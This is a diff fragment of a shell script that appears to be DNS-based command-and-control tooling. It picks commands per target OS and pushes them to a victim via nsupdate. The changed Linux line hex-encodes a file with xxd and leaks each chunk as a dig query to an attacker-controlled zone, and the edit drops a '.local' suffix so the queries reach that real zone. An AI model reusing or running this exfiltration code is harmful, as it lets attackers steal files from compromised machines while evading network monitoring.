@@ -36,7 +36,7 @@ elif [ $com -eq 2 ]; then
         	./send.sh c.txt | nsupdate
 
 	elif [ $target = "Linux" ]; then
-                echo 'for b in `xxd -p '$c'`; do dig +short $b.'$zone'.local; done' > c.txt
+                echo 'for b in `xxd -p '$c'`; do dig +short $b.'$zone'; done' > c.txt
         	./send.sh c.txt | nsupdate
 
 	elif [ $target = "Windows" ]; then
